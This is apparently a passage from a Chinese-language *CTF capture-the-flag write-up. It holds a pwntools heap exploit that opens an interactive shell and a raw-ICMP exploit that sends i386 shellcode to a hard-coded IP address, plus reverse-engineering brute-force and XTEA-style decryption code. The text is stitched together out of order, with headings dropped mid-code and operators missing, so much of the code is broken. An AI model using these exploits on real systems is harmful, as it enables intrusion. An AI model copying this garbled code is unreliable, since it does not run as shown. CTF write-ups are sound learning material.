add(0x2c,b'pad1\n',0xa9c,payload)
dele(b'exp')
payload = p64(space-0x2000+0x50) + p64(space-0x10+0x1000+0x90) + p64(0x5) + p64(0x30) + 
p64(0)
add(0x2c,b'fuck\n',0x2c,payload) 
# gdb.attach(sh)
dele(b'wwwww')
s.sendlineafter(b'option: ',b'5')
s.interactive()
# *CTF{TrY_th3_tr4dit10nlA_muS1_tr4iN1n9}
import array
import socket
import struct
from pwn import *
def inCksum(packet):
    if len(packet) & 1:
        packet = packet + b'\0'
    words = array.array('h', packet)
    sum = 0
    for word in words:
        sum += (word & 0xffff)
    sum = (sum >> 16) + (sum & 0xffff)
    sum = sum + (sum >> 16)
    return (~sum) & 0xffff
ret = 0x10014b
ebp = 0x1907ff0
stack = 0x1907fd8
def sendIcmp(payload):
    header = struct.pack('bbHHh', 8, 0, 0, 12345, 0)  # 创建头部
    data = payload
    packet = header + data
    chkSum = inCksum(packet)
    header = struct.pack('bbHHh', 8, 0, chkSum, 12345, 0)
    icmp_data = header + data
    print(icmp_data.hex())
    Sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, 
socket.getprotobyname("icmp"))
    Sock.sendto(icmp_data , ("20.239.70.121", 0))
    return Sock
shellcode = '''
    mov eax,0x0102390
    mov dword ptr [eax],{addr}
    add eax,4
    mov byte ptr [eax],0
    inc eax
    mov word ptr [eax],0x108a
    mov ebx,0x10014B
    xor eax,eax
    jmp ebx
'''
flag = ''
for i in range(100):
Reverse
Simple File System
单字节加密
*CTF{开头不变，加密后不变
简单分析下逻辑，直接在image.flag中进⾏hex匹配找到加密后的数据
写个爆破脚本
    context.arch = 'i386'
    # sc = shellcode.format(addr=((0x10C0D2+i)
#include 
#include 
int main()
{
    uint8_t x = 0;
    uint8_t data[32] = {
  0x00, 0xD2, 0xFC, 0xD8, 0xA2, 0xDA, 0xBA, 0x9E, 0x9C, 0x26, 0xF8, 0xF6, 0xB4, 0xCE, 
0x3C, 0xCC,
  0x96, 0x88, 0x98, 0x34, 0x82, 0xDE, 0x80, 0x36, 0x8A, 0xD8, 0xC0, 0xF0, 0x38, 0xAE, 
0x40, 0};
  for(int j=0;j> 1) | (x > 2) | (x > 3) | (32 * x);
            x ^= 0xed;
            x = (x >> 4) | (16 * x);
            x ^= 0xde;
            x = (x >> 5) | (8 * x);
            if(x == data[j])
            {
                printf("%c", i);
                break;
            }
        }
    }
    return 0;
}
u32 = lambda v: v & 0xffffffff
def ROL(data, shift, size=32):
    shift %= size
    remains = data >> (size - shift)
    body = (data 
#include 
void encipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) {
    unsigned int i;
    uint32_t v0=v[0], v1=v[1], sum=0, delta=0x10325476;
    for (i=0; i > 5)) + v0) ^ (sum + key[sum & 3]);
        sum += delta;
        v0 += (((v1 > 5)) + v1) ^ (sum + key[(sum>>11) & 3]);
    }
    v[1]=v0; v[0]=v1;
}
void decipher(unsigned int num_rounds, uint32_t v[2], uint32_t const key[4]) {
Jump
    unsigned int i;
    uint32_t v0=v[0], v1=v[1], delta=0x10325476, sum=delta*num_rounds;
    for (i=0; i > 5)) + v0) ^ (sum + key[(sum>>11) & 3]);
        sum -= delta;
        v0 -= (((v1 > 5)) + v1) ^ (sum + key[sum & 3]);
    }
    v[1]=v0; v[0]=v1;
}
int main() {
    uint32_t v[8] = {0xFDF5C266, 0x7A328286, 0xCE944004, 0x5DE08ADC, 0xA6E4BD0A, 
0x16CAADDC, 0x13CD6F0C, 0x1A75D936};
    uint32_t k[4] = {0x03020100, 0x07060504, 0x0B0A0908, 0x0F0E0D0C};
    for (int i = 0, round = 1; i 2L", *rt)
print(flag)
# 01WX456789ABCDEFGHIJKLMNOPQRSTUV 输⼊数据
# 201WX456789ABCDEFGHIJKLMNOPQRSTUV3  
# 01WX456789ABCDEFGHIJKLMNOPQRSTUV32  
# 1WX456789ABCDEFGHIJKLMNOPQRSTUV320  
# WX456789ABCDEFGHIJKLMNOPQRSTUV3201  
# X456789ABCDEFGHIJKLMNOPQRSTUV3201W  
# 456789ABCDEFGHIJKLMNOPQRSTUV3201WX  
# 56789ABCDEFGHIJKLMNOPQRSTUV3201WX4  
# 6789ABCDEFGHIJKLMNOPQRSTUV3201WX45
# 789ABCDEFGHIJKLMNOPQRSTUV3201WX456
# 89ABCDEFGHIJKLMNOPQRSTUV3201WX4567
# 9ABCDEFGHIJKLMNOPQRSTUV3201WX45678
# ABCDEFGHIJKLMNOPQRSTUV3201WX456789
# BCDEFGHIJKLMNOPQRSTUV3201WX456789A
# CDEFGHIJKLMNOPQRSTUV3201WX456789AB
# DEFGHIJKLMNOPQRSTUV3201WX456789ABC
# EFGHIJKLMNOPQRSTUV3201WX456789ABCD
# FGHIJKLMNOPQRSTUV3201WX456789ABCDE
# GHIJKLMNOPQRSTUV3201WX456789ABCDEF
# HIJKLMNOPQRSTUV3201WX456789ABCDEFG
# IJKLMNOPQRSTUV3201WX456789ABCDEFGH
# JKLMNOPQRSTUV3201WX456789ABCDEFGHI
# KLMNOPQRSTUV3201WX456789ABCDEFGHIJ
# LMNOPQRSTUV3201WX456789ABCDEFGHIJK
# MNOPQRSTUV3201WX456789ABCDEFGHIJKL
# NOPQRSTUV3201WX456789ABCDEFGHIJKLM
# OPQRSTUV3201WX456789ABCDEFGHIJKLMN
# PQRSTUV3201WX456789ABCDEFGHIJKLMNO
# QRSTUV3201WX456789ABCDEFGHIJKLMNOP
# RSTUV3201WX456789ABCDEFGHIJKLMNOPQ
# STUV3201WX456789ABCDEFGHIJKLMNOPQR
# TUV3201WX456789ABCDEFGHIJKLMNOPQRS
# UV3201WX456789ABCDEFGHIJKLMNOPQRST
# V3201WX456789ABCDEFGHIJKLMNOPQRSTU
# 3201WX456789ABCDEFGHIJKLMNOPQRSTUV 
# 201WX456789ABCDEFGHIJKLMNOPQRSTUV3
# 3201WX456789ABCDEFGHIJKLMNOPQRSTUV
# 01WX456789ABCDEFGHIJKLMNOPQRSTUV32
# 1WX456789ABCDEFGHIJKLMNOPQRSTUV320
# 456789ABCDEFGHIJKLMNOPQRSTUV3201WX
# 56789ABCDEFGHIJKLMNOPQRSTUV3201WX4
# 6789ABCDEFGHIJKLMNOPQRSTUV3201WX45
# 789ABCDEFGHIJKLMNOPQRSTUV3201WX456
# 89ABCDEFGHIJKLMNOPQRSTUV3201WX4567
# 9ABCDEFGHIJKLMNOPQRSTUV3201WX45678
# ABCDEFGHIJKLMNOPQRSTUV3201WX456789
# BCDEFGHIJKLMNOPQRSTUV3201WX456789A